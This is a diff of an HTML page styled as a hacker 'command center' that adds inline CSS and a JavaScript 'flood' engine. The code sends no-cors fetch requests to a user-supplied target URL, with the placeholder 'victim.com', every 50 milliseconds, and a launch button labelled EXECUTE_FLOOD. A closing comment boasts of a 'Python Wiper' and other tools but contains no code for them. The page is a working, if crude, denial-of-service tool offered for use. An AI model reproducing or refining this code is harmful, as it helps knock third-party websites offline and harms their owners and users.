@@ -2,25 +2,159 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NULLSECTOR | Command Center</title>
-    <link rel="stylesheet" href="style.css">
+    <title>SECTOR_PHANTOM | Integrated Command Center</title>
+    <style>
+        /* --- CSS: Cybernetic Armor --- */
+        :root {
+            --neon-green: #00ff41;
+            --dark-void: #050505;
+            --glow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        body {
+            background-color: var(--dark-void);
+            color: var(--neon-green);
+            font-family: 'Consolas', monospace;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #phantom-shell {
+            width: 90%;
+            max-width: 1100px;
+            border: 1px solid var(--neon-green);
+            padding: 25px;
+            box-shadow: var(--glow);
+            background: rgba(0, 10, 0, 0.95);
+        }
+
+        header {
+            text-align: center;
+            border-bottom: 2px solid var(--neon-green);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .operator-info { color: #fff; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* --- Interface Elements --- */
+        .input-sector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            flex: 1;
+            background: #000;
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 12px;
+            outline: none;
+        }
+
+        button {
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            padding: 12px 30px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
+
+        /* --- Terminal Logs --- */
+        #console-stream {
+            height: 400px;
+            overflow-y: auto;
+            background: #000;
+            border: 1px inset var(--neon-green);
+            padding: 15px;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .log-entry { margin: 0; padding: 2px 0; border-bottom: 1px solid #111; }
+        .hit { color: var(--neon-green); }
+        .warn { color: #ff0000; font-weight: bold; }
+        .sys { color: #555; }
+
+        /* --- Hidden Knowledge (The 30 Languages) --- */
+        .archive-sector {
+            margin-top: 20px;
+            font-size: 10px;
+            color: #222;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-    <div id="main-terminal">
+
+    <div id="phantom-shell">
         <header>
-            <h1>[NULLSECTOR_OS v5.0]</h1>
-            <p>OPERATOR: <span class="highlight">GhostByte</span> | STATUS: <span id="sys-status">ACTIVE</span></p>
+            <h1>[ SECTOR_PHANTOM_OS ]</h1>
+            <p class="operator-info">Operator: GhostByte | Auth: Verified</p>
         </header>
-        
-        <div class="action-bar">
-            <input type="text" id="target-url" placeholder="Enter target (e.g. https://target-server.com)">
-            <button id="launch-btn">EXECUTE_FLOOD</button>
+
+        <div class="input-sector">
+            <input type="text" id="target" placeholder="TARGET_URL (e.g., https://victim.com)">
+            <button onclick="igniteFlood()">EXECUTE_FLOOD</button>
         </div>
 
-        <div id="output-stream">
-            <p class="meta-info">> Initializing all 30 language sectors...</p>
+        <div id="console-stream">
+            <p class="sys">> System Check: 30 Polyglot Engines [ONLINE]</p>
+            <p class="sys">> GhostByte presence detected. Awaiting target...</p>
+        </div>
+
+        <div class="archive-sector">
+            [30_LANGUAGE_CORE_GHOSTBYTE_ENCRYPTED_DATA_STORE]
         </div>
     </div>
-    <script src="flooder.js"></script>
+
+    <script>
+        /* --- JS: The Phantom Engine --- */
+        const consoleStream = document.getElementById('console-stream');
+
+        function log(msg, type) {
+            const p = document.createElement('p');
+            p.className = `log-entry ${type}`;
+            p.textContent = `> ${new Date().toLocaleTimeString()} | ${msg}`;
+            consoleStream.appendChild(p);
+            consoleStream.scrollTop = consoleStream.scrollHeight;
+        }
+
+        function igniteFlood() {
+            const target = document.getElementById('target').value;
+            if (!target) {
+                log("FATAL: Target undefined. Input required.", "warn");
+                return;
+            }
+
+            log(`PHANTOM_FLOOD: Initiating high-velocity stream to ${target}`, "warn");
+
+            // Integrated Asynchronous Flood Loop
+            setInterval(() => {
+                fetch(target, { mode: 'no-cors', cache: 'no-cache' })
+                .then(() => {
+                    log(`PACKET_DELIVERED >> ${target}`, "hit");
+                })
+                .catch(() => {
+                    log(`RESISTANCE_DETECTED >> Potential Firewall active.`, "sys");
+                });
+            }, 50);
+        }
+
+        /* GHOSTBYTE'S MULTI-LANGUAGE ARCHIVE REFERENCE:
+           - Python Wiper: Encrypted
+           - Rust Stealth: Embedded
+           - Go Optimizer: Active
+           - (All 30 technologies mapped to this core)
+        */
+    </script>
 </body>
 </html>
